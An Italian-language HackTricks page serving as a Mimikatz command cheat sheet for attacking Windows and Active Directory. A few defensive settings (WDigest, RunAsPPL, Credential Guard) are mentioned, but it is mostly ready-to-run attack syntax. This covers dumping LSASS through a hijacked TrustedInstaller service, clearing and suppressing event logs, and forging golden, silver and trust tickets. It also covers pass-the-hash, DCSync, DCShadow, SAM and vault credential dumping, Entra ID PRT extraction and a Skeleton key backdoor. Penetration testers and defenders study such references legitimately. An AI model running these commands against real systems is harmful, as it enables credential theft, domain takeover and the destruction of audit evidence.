# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Questa pagina si basa su quella di [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consulta l’originale per ulteriori informazioni!<sup>[[3]](#references)</sup>

## LM e testo in chiaro in memoria

A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere dal furto di credenziali:

- **Gli hash LM e le password in testo semplice** non vengono più memorizzati in memoria per migliorare la sicurezza. Per disabilitare l’autenticazione Digest, è necessario configurare una specifica impostazione del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, con un valore DWORD pari a `0`; in questo modo, le password in "testo in chiaro" non vengono memorizzate nella cache di LSASS.

- **LSA Protection** viene introdotta per proteggere il processo Local Security Authority (LSA) dalla lettura non autorizzata della memoria e dall’iniezione di codice. A tale scopo, LSASS viene contrassegnato come processo protetto. Per attivare LSA Protection:
  1. Modificare il registro in _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
  2. Implementare un Group Policy Object (GPO) che applichi questa modifica al registro su tutti i dispositivi gestiti.

Nonostante queste protezioni, strumenti come Mimikatz possono aggirare LSA Protection tramite driver specifici, anche se è probabile che tali azioni vengano registrate nei log eventi.

Sulle workstation moderne questo aspetto è ancora più importante, perché **Credential Guard è abilitato per impostazione predefinita su molti sistemi Windows 11 22H2+ e Windows Server 2025 aggiunti al dominio e non-DC**, mentre **LSASS-as-PPL è abilitato per impostazione predefinita nelle nuove installazioni di Windows 11 22H2+**. In pratica, `sekurlsa::logonpasswords` spesso restituisce meno informazioni di quanto ci si aspettasse con le tecniche precedenti e gli operatori passano sempre più spesso a **minidump offline**, **estrazione delle chiavi Kerberos (`sekurlsa::ekeys`)** o **moduli orientati a CloudAP/PRT**. Per informazioni sulle protezioni, consulta [Windows credentials protections](credentials-protections.md).

### Contrastare la rimozione di SeDebugPrivilege

Gli amministratori dispongono in genere di SeDebugPrivilege, che consente loro di eseguire il debug dei programmi. Questo privilegio può essere limitato per impedire dump di memoria non autorizzati, una tecnica comune usata dagli attaccanti per estrarre credenziali dalla memoria. Tuttavia, anche se questo privilegio viene rimosso, l’account TrustedInstaller può comunque eseguire dump di memoria usando una configurazione personalizzata del servizio:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Questo consente di eseguire il dump della memoria di `lsass.exe` in un file, che può quindi essere analizzato su un altro sistema per estrarre le credenziali:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Opzioni di Mimikatz

La manomissione dei log eventi in Mimikatz prevede due azioni principali: cancellare i log eventi e applicare una patch al servizio Event per impedire la registrazione di nuovi eventi. Di seguito sono riportati i comandi per eseguire queste azioni:

#### Cancellazione dei log eventi

Mimikatz include il comando `event::clear`. Chiama l'API di Windows per cancellare il log eventi classico selezionato. Il log predefinito è `Security`; `/log:` consente di selezionarne un altro e il chiamante deve disporre dei diritti per cancellarlo. Non è la stessa cosa di `event::drop`, che tenta di impedire la scrittura di nuovi record.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Funzionalità sperimentale: applicazione di patch al servizio Event

- **Comando**: `event::drop`
- Questo comando sperimentale è progettato per modificare il comportamento del servizio di registrazione eventi, impedendogli di fatto di registrare nuovi eventi.
- Esempio: `mimikatz "privilege::debug" "event::drop" exit`

- Il comando `privilege::debug` garantisce a Mimikatz i privilegi necessari per modificare i servizi di sistema.
- Il comando `event::drop` applica quindi una patch al servizio di registrazione eventi.

### Attacchi ai ticket Kerberos

Usa i comandi seguenti come promemoria rapido della sintassi. Le pagine dedicate ai [golden ticket](../active-directory-methodology/golden-ticket.md), [silver ticket](../active-directory-methodology/silver-ticket.md), [diamond ticket](../active-directory-methodology/diamond-ticket.md) e [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contengono gli aggiornamenti sulle sfumature relative ad AES/PAC/opsec.

### Creazione di Golden Ticket

Un Golden Ticket consente di impersonare utenti con accesso a tutto il dominio. Comando e parametri principali:

- Comando: `kerberos::golden`
- Parametri:
  - `/domain`: il nome del dominio.
  - `/sid`: il Security Identifier (SID) del dominio.
  - `/user`: il nome utente da impersonare.
  - `/krbtgt`: l'hash NTLM dell'account del servizio KDC del dominio.
  - `/ptt`: inietta direttamente il ticket in memoria.
  - `/ticket`: salva il ticket per utilizzarlo in seguito.

Esempio:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Creazione di Silver Ticket

I Silver Ticket concedono l'accesso a servizi specifici. Comando e parametri principali:

- Comando: simile a Golden Ticket, ma rivolto a servizi specifici.
- Parametri:
  - `/service`: il servizio da prendere di mira (ad es., cifs, http).
  - Altri parametri simili a quelli di Golden Ticket.

Esempio:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Creazione di Trust Ticket

I Trust Ticket vengono usati per accedere alle risorse tra domini sfruttando le relazioni di trust. Comando e parametri principali:

- Comando: simile a Golden Ticket, ma per le relazioni di trust.
- Parametri:
  - `/target`: il FQDN del dominio di destinazione.
  - `/rc4`: l’hash NTLM dell’account di trust.

Esempio:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Comandi Kerberos aggiuntivi

- **Elenco dei ticket**:

  - Comando: `kerberos::list`
  - Elenca tutti i ticket Kerberos della sessione utente corrente.

- **Pass the Cache**: `kerberos::ptc` legge un file MIT/Heimdal `.ccache`, **non** un file `.kirbi`. Specifica il percorso del file come argomento posizionale: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` legge un file `.kirbi` o una directory contenente file di questo tipo. Accetta anche un percorso posizionale, non `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Per il workflow più ampio, vedi [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md).<sup>[[6]](#references)</sup>

- **Eliminazione dei ticket**:
  - Comando: `kerberos::purge`
  - Rimuove tutti i ticket Kerberos dalla sessione.
  - Utile prima di usare comandi di manipolazione dei ticket, per evitare conflitti.

### Over-Pass-the-Hash / Pass-the-Key

Se `RC4` è disabilitato o inaffidabile, Mimikatz può inserire le chiavi Kerberos **AES128/AES256** nella sessione di logon corrente, invece di usare solo un hash NT. Di solito è più adatto ai domini moderni che considerare `sekurlsa::pth` esclusivamente NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` riutilizza il processo corrente invece di avviare una nuova console, il che è utile quando vuoi eseguire subito comandi come `lsadump::dcsync` nello stesso contesto.

### Manomissione di Active Directory

- **DCShadow**: fa agire temporaneamente una macchina come DC per manipolare oggetti AD. Vedi [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: simula un DC per richiedere dati sulle password. Vedi [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accesso alle credenziali

- **LSADUMP::LSA**: estrae le credenziali da LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: impersona un DC usando i dati della password di un account computer.

  - _Nel contesto originale non è fornito alcun comando specifico per NetSync._

- **LSADUMP::SAM**: accede al database SAM locale.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: decritta i segreti archiviati nel registro.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: imposta un nuovo hash NTLM per un utente.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: recupera le informazioni di autenticazione delle relazioni di trust.
  - `mimikatz "lsadump::trust" exit`

### Credenziali cloud / Entra ID

Negli host **Entra ID** o **aggiunti in modalità ibrida**, `sekurlsa::cloudap` può esporre da LSASS il materiale memorizzato nella cache del **Primary Refresh Token (PRT)**. `ProofOfPossesionKey.KeyValue` è il blob della chiave di sessione protetto da DPAPI, non la chiave già decrittata.<sup>[[7]](#references)[[8]](#references)</sup> Per usare `/unprotect`, esegui `dpapi::cloudapkd` come `SYSTEM` (ad esempio, con `token::elevate` da una sessione Mimikatz con privilegi elevati) oppure popola prima la cache delle chiavi di Mimikatz con `sekurlsa::dpapi`. `privilege::debug` da solo non cambia il contesto del chiamante DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Copia `Context` e `Derived Key` corrispondenti dal primo comando nel secondo; Mimikatz genera un nuovo context se non ne viene fornito uno. Anche per una chiave protetta da TPM, Mimikatz può derivare una chiave di firma usando il TPM del dispositivo originale. Non è necessario esportare la chiave in chiaro, ma un risultato di derivazione della chiave riuscito può firmare un cookie del browser.<sup>[[7]](#references)</sup>

Una stringa PRT da sola non è sufficiente perché Microsoft Entra richiede la prova del possesso della chiave di sessione associata.<sup>[[9]](#references)</sup> Vedi [recupero delle chiavi DPAPI](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) per altre opzioni relative alle master key e [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) per la catena lato cloud.

### Varie

- **MISC::Skeleton**: Inietta una backdoor in LSASS su un DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalation dei privilegi

- **PRIVILEGE::Backup**: Acquisisce i diritti di backup.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Ottiene i privilegi di debug.
  - `mimikatz "privilege::debug" exit`

### Estrazione delle credenziali

- **SEKURLSA::LogonPasswords**: Mostra le credenziali degli utenti che hanno effettuato l'accesso.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Estrae i ticket Kerberos dalla memoria.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Manipolazione di SID e token

- **SID::add/modify**: Modifica SID e SIDHistory.

  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Modify: _Nessun comando specifico per la modifica nel contesto originale._

- **TOKEN::Elevate**: Si impersonano i token.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Consente più sessioni RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Elenca le sessioni TS/RDP.
  - _Nessun comando specifico fornito per TS::Sessions nel contesto originale._

### Vault

- Estrae le password da Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Gli strumenti dell'hacker – Moduli Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB e Entra ID: dai il benvenuto al tuo nuovo flusso di cache](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Riferimento dei comandi Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Codice sorgente del modulo event di Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Codice sorgente del modulo ccache di Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Codice sorgente del modulo Kerberos di Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Implementazione DPAPI di CloudAP in Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Un approfondimento sul Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Protezione del Primary Refresh Token di Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
